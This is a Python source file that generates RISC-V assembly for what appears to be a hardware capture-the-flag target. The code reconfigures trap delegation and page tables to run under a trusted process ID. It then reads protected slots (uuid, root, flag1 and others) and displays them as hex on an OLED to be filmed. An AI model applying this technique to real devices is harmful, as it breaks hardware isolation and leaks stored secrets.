"""asid_pages stage-2 (archive): hex pager on OLED. Prefer asid_qr."""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from constants import IOX_GPIOOUT_PC, PAGE_TABLE_ADDR, TRUSTED_PID  # noqa: E402
from oled_common import (  # noqa: E402
    DUMP_BASE,
    DUMP_BYTES,
    N_PAGES,
    _copy_calls,
    _mega,
    oled_driver_src,
)

__all__ = ["DUMP_BASE", "DUMP_BYTES", "N_PAGES", "oled_pages_src"]

FB_ADDR = 0x61005000
SEG_SRAM = 0x61005840
STATUS_ADDR = 0x61005F00
CKSUM_ADDR = 0x61005F04
STACK_ADDR = 0x61006000
PAGE_HOLD = 40_000_000
SATP = (1 << 31) | (TRUSTED_PID << 22) | (PAGE_TABLE_ADDR >> 12)

def oled_pages_src() -> str:
    return f"""
# asid_pages — dump uuid/cp/root/flag1/n0/chaff/n1, page OLED, loop
    fence.i
    li sp, 0x{STACK_ADDR:x}
    call oled_bringup

    addi t0, zero, 0
    csrw medeleg, t0
    csrw mideleg, t0

    li a0, 0x{PAGE_TABLE_ADDR:x}
    li a1, 1024
zero_pt:
    beq a1, zero, pt_fill
    sw zero, 0(a0)
    addi a0, a0, 4
    addi a1, a1, -1
    j zero_pt
pt_fill:
    li a0, 0x{PAGE_TABLE_ADDR:x}
    li t0, 0x{_mega(0x40000000):x}
    sw t0, 0x400(a0)
    li t0, 0x{_mega(0x50000000):x}
    sw t0, 0x500(a0)
    li t0, 0x{_mega(0x60000000):x}
    sw t0, 0x600(a0)
    li t0, 0x{_mega(0x61000000):x}
    sw t0, 0x610(a0)
    sfence.vma

    la t0, m_trap
    csrw mtvec, t0

    li t0, 0x{SATP:x}
    csrw satp, t0
    sfence.vma

    li t1, 0x11111111
    li t2, 0x{STATUS_ADDR:x}
    sw t1, 0(t2)

    csrr t0, mstatus
    li t1, 0x1800
    not t1, t1
    and t0, t0, t1
    csrw mstatus, t0

    la t0, s_stub
    csrw mepc, t0
    mret

m_trap:
    li s10, 0
page_loop:
    call draw_page
    li a0, {PAGE_HOLD}
    call delay
    addi s10, s10, 1
    li t0, {N_PAGES}
    bne s10, t0, page_loop
    li s10, 0
    j page_loop

s_stub:
    li t1, 0x22222222
    li t2, 0x{STATUS_ADDR:x}
    sw t1, 0(t2)
{_copy_calls()}
    li a0, 0x{DUMP_BASE:x}
    li a1, {DUMP_BYTES // 4}
    addi t2, zero, 0
ck_loop:
    beq a1, zero, ck_done
    lw t0, 0(a0)
    xor t2, t2, t0
    addi a0, a0, 4
    addi a1, a1, -1
    j ck_loop
ck_done:
    li t1, 0x{CKSUM_ADDR:x}
    sw t2, 0(t1)
    li t1, 0x33333333
    li t2, 0x{STATUS_ADDR:x}
    sw t1, 0(t2)
    ecall
    j s_done
s_done:
    j s_done

# a0=rram a1=dest a2=nslots (32B each)
copy_slots:
copy_slot:
    beq a2, zero, copy_ret
    addi a3, zero, 8
copy_w:
    beq a3, zero, copy_next
    lw t0, 0(a0)
    sw t0, 0(a1)
    addi a0, a0, 4
    addi a1, a1, 4
    addi a3, a3, -1
    j copy_w
copy_next:
    addi a2, a2, -1
    j copy_slot
copy_ret:
    ret

# s10 = page index. STATUS = page | (0xBE<<8) | (cksum16<<16)
draw_page:
    addi sp, sp, -8
    sw ra, 4(sp)
    li s1, 0x{IOX_GPIOOUT_PC:x}
    li s3, 0x{FB_ADDR:x}
    lw s0, 0(s1)
    li t0, 0x{CKSUM_ADDR:x}
    lw t1, 0(t0)
    li t2, 0xffff
    and t1, t1, t2
    slli t1, t1, 16
    li t2, 0x{N_PAGES:x}
    slli t2, t2, 8
    or t1, t1, t2
    or t1, t1, s10
    li t0, 0x{STATUS_ADDR:x}
    sw t1, 0(t0)
    call fb_clear
    call fb_stripe
    call load_seg7
    li s5, 0
    li s4, 0x{STATUS_ADDR:x}
st_byte:
    li t0, 4
    beq s5, t0, leg_start
    lbu t1, 0(s4)
    srli a0, t1, 4
    slli a1, s5, 4
    li a2, 16
    call blit_7seg
    lbu t1, 0(s4)
    andi a0, t1, 0xf
    slli t2, s5, 4
    addi a1, t2, 8
    li a2, 16
    call blit_7seg
    addi s4, s4, 1
    addi s5, s5, 1
    j st_byte
leg_start:
    li s5, 0
leg_loop:
    li t0, 16
    beq s5, t0, hex_start
    mv a0, s5
    slli a1, s5, 3
    li a2, 4
    call blit_7seg
    addi s5, s5, 1
    j leg_loop
hex_start:
    slli t0, s10, 6
    li s4, 0x{DUMP_BASE:x}
    add s4, s4, t0
    li s5, 0
hex_byte:
    li t0, 64
    beq s5, t0, hex_done
    lbu t1, 0(s4)
    srli a0, t1, 4
    andi t2, s5, 7
    slli t2, t2, 1
    slli a1, t2, 3
    srli a2, s5, 3
    slli t3, a2, 3
    slli t4, a2, 2
    add a2, t3, t4
    addi a2, a2, 28
    call blit_7seg
    lbu t1, 0(s4)
    andi a0, t1, 0xf
    andi t2, s5, 7
    slli t2, t2, 1
    addi t2, t2, 1
    slli a1, t2, 3
    srli a2, s5, 3
    slli t3, a2, 3
    slli t4, a2, 2
    add a2, t3, t4
    addi a2, a2, 28
    call blit_7seg
    addi s4, s4, 1
    addi s5, s5, 1
    j hex_byte
hex_done:
    call oled_flush
    lw ra, 4(sp)
    addi sp, sp, 8
    ret
""" + oled_driver_src(fb_addr=FB_ADDR, seg_sram=SEG_SRAM)


def pages_layout_note() -> str:
    return (
        f"OLED pages 0–{N_PAGES - 1}: 64B each. Status = page, 0x{N_PAGES:02X}, cksum16. "
        "Dump order uuid, cp_id, root, flag1, n0, chaff, n1. Film full loop. Restore loader.uf2."
    )
